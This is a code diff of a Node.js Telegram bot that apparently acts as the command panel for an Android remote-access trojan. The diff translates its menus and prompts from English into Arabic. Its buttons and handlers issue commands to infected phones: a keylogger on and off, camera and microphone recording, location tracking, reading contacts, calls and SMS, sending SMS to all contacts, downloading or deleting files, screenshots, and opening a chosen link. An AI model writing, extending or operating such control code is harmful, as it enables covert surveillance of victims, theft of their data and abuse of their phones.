@@ -407,70 +407,70 @@ appBot.on("callback_query", (callbackQuery) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        {text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}`},
-                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}`}
+                        {text: 'تطبيقات', callback_data: `apps:${uuid}`},
+                        {text: 'معلومات الجهاز', callback_data: `device_info:${uuid}`}
                     ],
                     [
-                        {text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
-                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
+                        {text: 'ملف من الهاتف', callback_data: `file:${uuid}`},
+                        {text: 'حذف ملف', callback_data: `delete_file:${uuid}`}
                     ],
                     [
-                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
-                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}`},
+                        {text: 'الحافضه', callback_data: `clipboard:${uuid}`},
+                        {text: 'تسجيل مايكروفون', callback_data: `microphone:${uuid}`},
                     ],
                     [
-                        {text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}`},
-                        {text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}`}
+                        {text: 'كاميرا رئسيه', callback_data: `camera_main:${uuid}`},
+                        {text: 'كاميرا اماميه', callback_data: `camera_selfie:${uuid}`}
                     ],
                     [
-                        {text: '𝙍𝙚𝙘𝙤𝙧𝙙 𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `rec_camera_main:${uuid}`},
-                        {text: '𝙍𝙚𝙘𝙤𝙧𝙙 𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `rec_camera_selfie:${uuid}`}
+                        {text: 'تسجيل الكاميرا الخلفيه', callback_data: `rec_camera_main:${uuid}`},
+                        {text: 'تسجيل الكاميرا الاماميه', callback_data: `rec_camera_selfie:${uuid}`}
                     ],
                     [
-                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}`},
+                        {text: 'الموقع', callback_data: `location:${uuid}`},
                         {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                     ],
                     [
-                        {text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}`},
-                        {text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}`}
+                        {text: 'الاتصالات', callback_data: `calls:${uuid}`},
+                        {text: 'جهات الاتصال', callback_data: `contacts:${uuid}`}
                     ],
                     [
-                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}`},
-                        {text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}`}
+                        {text: 'رج الهاتف', callback_data: `vibrate:${uuid}`},
+                        {text: 'ارسال اشعار', callback_data: `show_notification:${uuid}`}
                     ],
                     [
-                        {text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}`},
-                        {text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}`}
+                        {text: 'رسائل', callback_data: `messages:${uuid}`},
+                        {text: 'ارسل رساله', callback_data: `send_message:${uuid}`}
                     ],
                     [
-                        {text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
-                        {text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
+                        {text: 'تشغيل صوت', callback_data: `play_audio:${uuid}`},
+                        {text: 'ايقاف الصوت', callback_data: `stop_audio:${uuid}`},
                     ],
                     [
                         {text: '🔥', callback_data: `my_fire_emoji:${uuid}`},
-                        {text: '𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩', callback_data: `screenshot:${uuid}`},
+                        {text: 'صورة لشاشه', callback_data: `screenshot:${uuid}`},
                     ],
                     [
-                        {text: '𝙏𝙤𝙧𝙘𝙝 𝙊𝙣', callback_data: `torch_on:${uuid}`},
-                        {text: '𝙏𝙤𝙧𝙘𝙝 𝙊𝙛𝙛', callback_data: `torch_off:${uuid}`},
+                        {text: 'تشغيل المس', callback_data: `torch_on:${uuid}`},
+                        {text: 'تعطيل المس', callback_data: `torch_off:${uuid}`},
                     ],
                     [
-                        {text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙜𝙚𝙧 𝙊𝙣', callback_data: `keylogger_on:${uuid}`},
-                        {text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙜𝙚𝙧 𝙊𝙛𝙛', callback_data: `keylogger_off:${uuid}`},
+                        {text: 'تسجيل الازرار', callback_data: `keylogger_on:${uuid}`},
+                        {text: 'ايقاف تتبع الازرار', callback_data: `keylogger_off:${uuid}`},
                     ],
                     [
-                        {text: '𝙊𝙥𝙚𝙣 𝙏𝙖𝙧𝙜𝙚𝙩 𝙇𝙞𝙣𝙠', callback_data: `open_target_link:${uuid}`},
-                        {text: '𝙏𝙚𝙭𝙩 𝙏𝙤 𝙎𝙥𝙚𝙚𝙘𝙝', callback_data: `text_to_speech:${uuid}`},
+                        {text: 'فتح رابط', callback_data: `open_target_link:${uuid}`},
+                        {text: 'تحويل النص الى صوت', callback_data: `text_to_speech:${uuid}`},
                     ],
                     [
                         {
-                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
+                            text: 'ارسل رساله الى جميع جهات الاتصال',
                             callback_data: `send_message_to_all:${uuid}`
                         },
                     ],
                     [
                         {
-                            text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝘽𝙪𝙩𝙩𝙤𝙣𝙨',
+                            text: 'ازرار الهاتف',
                             callback_data: `device_button:${uuid}`
                         },
                     ]
@@ -487,8 +487,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد التنفيذ\n\n' +
+            '• سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'contacts') {
@@ -499,8 +499,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد التنفيذ\n\n' +
+            '• سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'messages') {
@@ -511,8 +511,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد التنفيذ\n\n' +
+            '• سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'apps') {
@@ -523,8 +523,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد التنفيذ𝙨\n\n' +
+            '• سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'device_info') {
@@ -535,8 +535,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد التنفيذ\n\n' +
+            '•  سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'clipboard') {
@@ -547,8 +547,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد التنفيذ\n\n' +
+            '•  سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'camera_main') {
@@ -559,8 +559,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد التنفيذ\n\n' +
+            '• سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'camera_selfie') {
@@ -571,8 +571,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد التنفيذ\n\n' +
+            '• سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'location') {
@@ -583,8 +583,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد التنفيذ\n\n' +
+            '• سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'vibrate') {
@@ -595,8 +595,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°•  طلبك قيد التنفيذ\n\n' +
+            '• سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'stop_audio') {
@@ -607,22 +607,22 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد التنفيذ\n\n' +
+            '• سنرسل لك الرد بعد قليل'
         )
     }
     if (commend == 'send_message') {
         appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
-            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
+        appBot.sendMessage(id, '°• يرجى الرد بالرقم الذي ترغب في إرسال الرسالة النصية إليه.\n\n' +
+            '•إذا كنت ترغب في إرسال رسائل نصية إلى أرقام محلية، يمكنك إدخال الرقم مع الصفر في البداية، وإلا يجب عليك إدخال الرقم مع رمز الدولة.',
             {reply_markup: {force_reply: true}})
         currentUuid = uuid
     }
     if (commend == 'send_message_to_all') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
-            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
+            '°• ادخل الرسالة التي ترغب في إرسالها إلى جميع جهات الاتصال.\n\n' +
+            '• كن حذرًا من أن الرسالة لن تُرسل إذا كان عدد الأحرف في رسالتك يتجاوز الحد المسموح به.',
             {reply_markup: {force_reply: true}}
         )
         currentUuid = uuid
@@ -631,8 +631,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'open_target_link') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙\n\n' +
-            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛᴏ sᴇɴᴅ ʟɪɴᴋs ᴀʟᴏɴᴇ ᴡɪᴛʜᴏᴜᴛ ᴀɴʏ ᴛᴇxᴛ',
+            '°• أدخل الرابط الذي ترغب في إرساله.\n\n' +
+            '•كن حذرًا من إرسال الروابط بمفردها دون أي نص مرفق.',
             {reply_markup: {force_reply: true}}
         )
         currentUuid = uuid
@@ -640,8 +640,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'text_to_speech') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙏𝙚𝙭𝙩 𝙩𝙤 𝙎𝙥𝙚𝙖𝙠\n\n' +
-            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛᴇxᴛ ᴛʜᴀᴛ ʜᴀs ᴛᴏ ʙᴇ sᴘᴏᴋᴇɴ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ. ᴀɴʏ ʟᴀɴɢᴜᴀɢᴇ ᴀᴄᴄᴇᴘᴛɪʙʟᴇ.',
+            '°• أدخل النص الذي ترغب في تحويله إلى كلام.\n\n' +
+            '• لاحظ أنه يجب عليك إدخال النص الذي ترغب في أن يُنطق على الجهاز. يمكن استخدام أي لغة.',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -649,8 +649,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'my_fire_emoji') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 🔥 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ 🔥 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ\n🔥🔥\n🔥🔥',
+            '°• 🔥 جاري معالجة طلبك.\n\n' +
+            '• ستتلقى 🔥 في الدقائق القليلة القادمة.\n🔥🔥\n🔥🔥',
             {reply_markup: {force_reply: false}, parse_mode: "HTML"})
         appBot.sendMessage(id,
             '  🔥  \n' +
@@ -659,7 +659,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["اجهزة متصله"], ["ارسال اوامر"]],
                     'resize_keyboard': true
                 }
             }
@@ -674,8 +674,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد المعالجة \n\n' +
+            '• ستتلقى ردًا في الدقائق القليلة القادمة'
         )
     }
     if (commend == 'torch_off') {
@@ -687,7 +687,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '• ستتلقى ردًا في الدقائق القليلة القادمة'
         )
     }
     if (commend == 'keylogger_on') {
@@ -698,8 +698,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد المعالجة\n\n' +
+            '• ستتلقى ردًا في الدقائق القليلة القادمة'
         )
     }
     if (commend == 'keylogger_off') {
@@ -710,8 +710,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°• طلبك قيد المعالجة\n\n' +
+            '• ستتلقى ردًا في الدقائق القليلة القادمة'
         )
     }
     if (commend == 'screenshot') {
@@ -722,14 +722,14 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
+            '°•طلبك قيد المعالجة\n\n' +
+            '• ستتلقى ردًا في الدقائق القليلة القادمة'
         )
     }
 
     if (commend == 'device_button') {
         currentUuid = uuid
-        appBot.editMessageText(`°• 𝙋𝙧𝙚𝙨𝙨 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
+        appBot.editMessageText(`°• اضغط على ازرار الهاتف : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
             width: 10000,
             chat_id: id,
             message_id: msg.message_id,
@@ -813,8 +813,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'file') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
-            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
+            '°• أدخل مسار الملف الذي ترغب في تنزيله\n\n' +
+            '•لا تحتاج إلى إدخال المسار الكامل للملف، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> للاستلام ملفات المعرض.',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -822,8 +822,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'delete_file') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
-            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
+            '°• أدخل مسار الملف الذي ترغب في حذفه.\n\n' +
+            '• لا تحتاج إلى إدخال المسار الكامل للملف، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لإزالة ملفات المعرض،',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -831,8 +831,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'microphone') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
-            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
+            '°• خل المدة التي ترغب في تسجيل الصوت بها باستخدام الميكروفون\n\n' +
+            '• يرجى ملاحظة أنه يجب عليك إدخال الوقت بشكل رقمي بالثواني.',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -840,8 +840,8 @@ appBot.on("callback_query", (callbackQuery) => {
